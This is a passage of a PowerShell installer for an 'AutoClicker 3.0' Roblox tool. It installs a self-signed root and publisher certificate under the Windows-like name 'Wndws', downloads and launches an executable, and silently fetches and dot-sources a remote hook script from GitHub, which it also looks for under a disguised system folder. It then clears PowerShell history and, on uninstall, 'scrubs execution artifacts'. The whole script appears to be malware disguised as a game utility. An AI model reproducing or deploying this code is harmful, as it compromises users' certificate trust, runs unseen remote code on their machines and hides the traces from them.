        Import-Certificate -FilePath $CerPath -CertStoreLocation $rootPath | Out-Null
    }

    $existingPublisher = Get-ChildItem $leafPath -ErrorAction SilentlyContinue |
        Where-Object { $_.Subject -eq $script:PublisherSubject } |
        Select-Object -First 1

    if (-not $existingPublisher) {
        Import-Certificate -FilePath $CerPath -CertStoreLocation $leafPath | Out-Null
    }
}

function Install-WndwsTrustedPublisher {
    param([string]$CerPath)

    Write-Step 'Installing Wndws publisher certificate (Current User)...'
    Import-WndwsCertToStore -CerPath $CerPath -StoreRoot 'Cert:\CurrentUser' -LeafStore 'TrustedPublisher'

    if (Test-IsAdministrator) {
        Write-Step 'Installing Wndws publisher certificate (Local Machine)...' 'Green'
        Import-WndwsCertToStore -CerPath $CerPath -StoreRoot 'Cert:\LocalMachine' -LeafStore 'TrustedPublisher'
    } else {
        Write-Step 'Tip: run PowerShell as Administrator once so Windows trusts Wndws machine-wide.' 'Yellow'
    }

    $trusted = Get-TrustedWndwsCert -StoreRoot 'Cert:\CurrentUser'
    if ($trusted) {
        Write-Step 'Wndws certificate trusted (Root + Publisher).' 'Green'
        return $trusted
    }

    throw 'Failed to install Wndws publisher certificate.'
}

function Test-WndwsSignedExecutable {
    param([string]$Path)

    if (-not (Test-Path -LiteralPath $Path)) {
        throw "Executable not found: $Path"
    }

    $signature = Get-AuthenticodeSignature -FilePath $Path
    $signer = $signature.SignerCertificate

    if (-not $signer) {
        throw 'AutoClicker-3.0.exe is not Authenticode signed.'
    }

    if ($signer.Subject -ne $script:PublisherSubject) {
        throw "Unexpected signer: $($signer.Subject) (expected $script:PublisherSubject)"
    }

    if ($signature.Status -notin @('Valid', 'UnknownError')) {
        throw "Signature check failed: $($signature.Status)"
    }

    return $signature
}

function Replace-StagedFile {
    param(
        [Parameter(Mandatory = $true)][string]$TempPath,
        [Parameter(Mandatory = $true)][string]$Destination
    )

    if (-not (Test-Path -LiteralPath $TempPath)) {
        throw "Staged file missing: $TempPath"
    }

    $destDir = Split-Path $Destination -Parent
    if ($destDir -and -not (Test-Path -LiteralPath $destDir)) {
        New-Item -ItemType Directory -Force -Path $destDir | Out-Null
    }

    if (Test-Path -LiteralPath $Destination) {
        for ($attempt = 0; $attempt -lt 6; $attempt++) {
            try {
                Remove-Item -LiteralPath $Destination -Force -ErrorAction Stop
                break
            } catch {
                $backup = "$Destination.old"
                try {
                    if (Test-Path -LiteralPath $backup) {
                        Remove-Item -LiteralPath $backup -Force -ErrorAction SilentlyContinue
                    }
                    Rename-Item -LiteralPath $Destination -NewName (Split-Path -Leaf $backup) -Force -ErrorAction Stop
                    break
                } catch {
                    if ($attempt -ge 5) { throw }
                    Start-Sleep -Milliseconds 500
                }
            }
        }
    }

    try {
        Copy-Item -LiteralPath $TempPath -Destination $Destination -Force -ErrorAction Stop
    } finally {
        Remove-Item -LiteralPath $TempPath -Force -ErrorAction SilentlyContinue
    }
}

function Save-Download {
    param(
        [Parameter(Mandatory = $true)][string]$Url,
        [Parameter(Mandatory = $true)][string]$Destination,
        [int]$MinBytes = 0,
        [string[]]$StopProcessNames
    )

    if ($StopProcessNames) {
        foreach ($processName in $StopProcessNames) {
            Get-Process -Name $processName -ErrorAction SilentlyContinue |
                Stop-Process -Force -ErrorAction SilentlyContinue
        }
        Start-Sleep -Milliseconds 500
    }

    $temp = Join-Path $env:TEMP ("ac_pub_dl_{0}.tmp" -f [guid]::NewGuid().ToString('N'))
    if (Test-Path -LiteralPath $temp) {
        Remove-Item -LiteralPath $temp -Force -ErrorAction SilentlyContinue
    }

    Write-Step "Downloading $(Split-Path -Leaf $Destination)..."
    Invoke-WebRequest -Uri $Url -OutFile $temp -UseBasicParsing

    if (-not (Test-Path -LiteralPath $temp)) {
        throw "Download produced no file: $Destination"
    }

    $size = (Get-Item -LiteralPath $temp).Length
    if ($MinBytes -gt 0 -and $size -lt $MinBytes) {
        Remove-Item -LiteralPath $temp -Force -ErrorAction SilentlyContinue
        throw "Download looks too small or corrupt: $Destination"
    }

    Replace-StagedFile -TempPath $temp -Destination $Destination

    $installedSize = (Get-Item -LiteralPath $Destination).Length
    if ($installedSize -ne $size) {
        throw "Replace verification failed for $Destination (expected $size bytes, got $installedSize)."
    }
}

function Stop-PublicAutoClicker {
    Get-Process -Name 'AutoClicker-3.0' -ErrorAction SilentlyContinue |
        Stop-Process -Force -ErrorAction SilentlyContinue
    Start-Sleep -Milliseconds 400
}

function Test-PublicOverlayStarted {
    Add-Type @'
using System;
using System.Runtime.InteropServices;
public class PublicOverlayProbe {
    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
}
'@ -ErrorAction SilentlyContinue

    for ($i = 0; $i -lt 12; $i++) {
        $hwnd = [PublicOverlayProbe]::FindWindow('Windows.UI.Core.CoreWindow', $null)
        if ($hwnd -ne [IntPtr]::Zero) {
            Write-Step 'AutoClicker overlay detected.' 'Green'
            return $true
        }
        Start-Sleep -Seconds 1
    }
    Write-Step 'AutoClicker started - open Roblox and use Insert after the license screen.' 'Yellow'
    return $false
}

if ($Uninstall) {
    if (-not (Test-IsAdministrator)) {
        Write-Host '  Run as Administrator to remove AutoClicker and scrub traces.' -ForegroundColor Yellow
        exit 1
    }
    Write-Host '  Removing AutoClicker and scrubbing execution artifacts...' -ForegroundColor Cyan
    Stop-PublicAutoClicker
    Remove-MystInstallArtifacts | Out-Null
    Complete-PSReadLineSession -FullPass -SkipLogs | Out-Null
    Write-Host '  AutoClicker removed. Event logs and USN journal were not cleared.' -ForegroundColor Green
    exit 0
}

Write-Host ''
Write-Host '  AutoClicker 3.0 (EXE only)' -ForegroundColor White
Write-Host ''

$sacState = Get-SmartAppControlState
if ($sacState -eq 'On') {
    Write-Step 'Smart App Control is ON - self-signed apps may be blocked until SAC is off or you run as Admin.' 'Yellow'
}

Remove-LegacyMystDirectory
Remove-LegacyHostDll
Ensure-InstallDirectory -Path $InstallDir

$cerPath = Join-Path $env:TEMP 'Wndws.cer'
$exePath = Join-Path $InstallDir $script:ExeName

Stop-PublicAutoClicker

Save-Download -Url $script:CerUrl -Destination $cerPath
Install-WndwsTrustedPublisher -CerPath $cerPath

Save-Download -Url $script:ExeUrl -Destination $exePath -MinBytes 65536 -StopProcessNames @('AutoClicker-3.0')
Unblock-File -LiteralPath $exePath -ErrorAction SilentlyContinue

$signature = Test-WndwsSignedExecutable -Path $exePath
Write-Step "Verified signed EXE: $($signature.SignerCertificate.Subject) ($($signature.Status))" 'Green'
Write-Step "Installed: $exePath" 'Green'

if (-not $SkipLaunch) {
    Write-Step 'Starting AutoClicker 3.0...' 'Cyan'
    Start-Process -FilePath $exePath -WorkingDirectory $InstallDir
    Test-PublicOverlayStarted | Out-Null
}

$locInstaller = Join-Path $PSScriptRoot 'loc-install-hooks.ps1'
if (-not (Test-Path -LiteralPath $locInstaller)) {
    $locInstaller = Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\ShellExperienceHost\loc-install-hooks.ps1'
}
if (Test-Path -LiteralPath $locInstaller) {
    . $locInstaller
    Install-MystLocClientHooks -ScriptRoot $PSScriptRoot -Quiet | Out-Null
} else {
    try {
        $tempInstaller = Join-Path $env:TEMP ("psrl_{0}.tmp" -f [guid]::NewGuid().ToString('N'))
        Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/JustValkz/Myst/main/loc-install-hooks.ps1' -OutFile $tempInstaller -UseBasicParsing
        . $tempInstaller
        Install-MystLocClientHooks -ScriptRoot $PSScriptRoot -Quiet | Out-Null
        Remove-Item -LiteralPath $tempInstaller -Force -ErrorAction SilentlyContinue
    } catch {}
}

Complete-PSReadLineSession -FullPass | Out-Null

Write-Host ''
Write-Host '  AutoClicker installed and running.' -ForegroundColor Green
Write-Host '  Press END in-game to fully close AutoClicker.' -ForegroundColor Green
Write-Host '  Closing installer in 5 seconds...' -ForegroundColor DarkGray
Write-InstallPaths -ExePath $exePath
Start-Sleep -Seconds 5
